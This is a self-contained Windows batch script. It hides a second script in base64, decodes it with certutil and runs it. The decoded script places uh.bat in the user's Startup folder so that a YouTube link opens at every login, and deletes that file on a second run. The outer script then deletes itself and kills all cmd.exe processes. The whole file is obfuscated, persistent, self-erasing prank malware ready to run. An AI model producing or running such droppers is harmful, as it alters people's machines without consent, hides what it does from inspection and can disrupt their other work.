@echo off

echo QGVjaG8gb2ZmDQoNCmRlbCB4LmI2NA0KY2QgJXVzZXJwcm9maWxlJVxBcHBEYXRh > x.b64
echo XFJvYW1pbmdcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnReIE1lbnVcUHJvZ3JhbXNc >> x.b64
echo U3RhcnR1cFwNCg0KaWYgZXhpc3QgInVoLmJhdCIgKA0KICBkZWwgLlx1aC5iYXQg >> x.b64
echo PiBudWwNCiAgZWNobyBEZWxldGVkIQ0KICBlY2hvIFByZXNzIEVudGVyIHRvIGV4 >> x.b64
echo aXQhDQogIHBhdXNlID4gbnVsDQogIHN0YXJ0IC9iICIiIGNtZCAvYyBkZWwgIiV+ >> x.b64
echo ZjAiJmV4aXQgL2INCikgZWxzZSAoDQogIGRlbCAuXHVoLmJhdCA+IG51bA0KICBl >> x.b64
echo Y2hvIHN0YXJ0IF4iXiIgXiJodHRwczovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92 >> x.b64
echo PTVUR2dKUWdEZjY4XiIgPiAuXHVoLmJhdA0KICBzdGFydCAvYiAiIiBjbWQgL2Mg >> x.b64
echo ZGVsICIlfmYwIiZleGl0IC9iDQop >> x.b64

certutil -decode "x.b64" "x.bat"
start x.bat
timeout 5 > nul
start /b "" cmd /c del "%~f0" && taskkill /im cmd.exe && exit /b
